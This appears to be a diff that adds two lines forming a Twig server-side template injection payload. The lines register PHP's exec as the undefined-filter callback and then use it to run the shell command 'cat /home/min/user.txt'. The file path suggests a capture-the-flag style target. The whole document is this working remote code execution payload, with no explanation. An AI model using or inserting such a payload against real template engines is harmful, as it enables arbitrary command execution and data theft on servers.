@@ -1,0 +1,2 @@
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("cat /home/min/user.txt")}}
